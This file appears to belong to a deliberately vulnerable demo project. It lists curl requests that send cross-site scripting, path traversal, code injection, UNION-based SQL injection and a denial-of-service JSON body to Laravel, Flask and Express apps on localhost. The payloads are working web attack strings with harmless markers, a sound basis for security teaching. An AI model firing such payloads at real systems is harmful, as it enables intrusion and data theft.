## Cross Site Scripting (Laravel)
curl "http://localhost:8000/cross-site-scripting?name=Luca%3Cscript%3Ealert(%22You%20have%20been%20hacked!%22)%3B%3C%2Fscript%3E"

## Denial Of Service (Laravel)
curl -X "POST" "http://localhost:8000/denial-of-service" \
     -H 'Content-Type: application/json' \
     -d $'[
  {
    "name": "User 1"
  },
  {
    "name": "User 2"
  }
]'

## Path Traversal (Laravel)
curl "http://localhost:8000/path-traversal?category=..%2Fpasswds.txt" \
     -H 'Accept: application/json' \
     -H 'Content-Type: application/json'

## Remote Code Execution (Laravel)
curl "http://localhost:8000/remote-code-execution?amount=error_log(%27You%20have%20been%20hacked!%27)%3B%2010"

## SQL Injection (Laravel)
curl "http://localhost:8000/sql-injection?search=RANDOMCHARACTERSWHICHNEVERMATCH%25%27%20UNION%20SELECT%20FirstName,%20LastName%20from%20customers%20WHERE%20LastName%20LIKE%20%27%25" \
     -H 'Accept: application/json'

## Cross Site Scripting (Flask)
curl "http://localhost:5000/cross-site-scripting?name=Luca%3Cscript%3Ealert(%22You%20have%20been%20hacked!%22)%3B%3C%2Fscript%3E"

## Denial Of Service (Flask)
curl -X "POST" "http://localhost:5000/denial-of-service" \
     -H 'Content-Type: application/json' \
     -d $'[
  {
    "name": "User 1"
  },
  {
    "name": "User 2"
  }
]'

## Path Traversal (Flask)
curl "http://localhost:5000/path-traversal?category=..%2Fpasswds.txt" \
     -H 'Accept: application/json' \
     -H 'Content-Type: application/json'

## Remote Code Execution (Flask)
curl "http://localhost:5000/remote-code-execution?amount=print(%27You%20have%20been%20hacked!%27)"

## SQL Injection (Flask)
curl "http://localhost:5000/sql-injection?search=RANDOMCHARACTERSWHICHNEVERMATCH%25%27%20UNION%20SELECT%20FirstName,%20LastName%20from%20customers%20WHERE%20LastName%20LIKE%20%27%25" \
     -H 'Accept: application/json'

## Cross Site Scripting (Express)
curl "http://localhost:3000/cross-site-scripting?name=Luca%3Cscript%3Ealert(%22You%20have%20been%20hacked!%22)%3B%3C%2Fscript%3E"

## Denial Of Service (Express)
curl -X "POST" "http://localhost:3000/denial-of-service" \
     -H 'Content-Type: application/json' \
     -d $'[
  {
    "name": "User 1"
  },
  {
    "name": "User 2"
  }
]'

## Path Traversal (Express)
curl "http://localhost:3000/path-traversal?category=..%2Fpasswds.txt" \
     -H 'Accept: application/json' \
     -H 'Content-Type: application/json'

## Remote Code Execution (Express)
curl "http://localhost:3000/remote-code-execution?amount=console.log(%27You%20have%20been%20hacked!%27)%3B%2010"

## SQL Injection (Express)
curl "http://localhost:3000/sql-injection?search=RANDOMCHARACTERSWHICHNEVERMATCH%25%27%20UNION%20SELECT%20FirstName,%20LastName%20from%20customers%20WHERE%20LastName%20LIKE%20%27%25" \
     -H 'Accept: application/json'
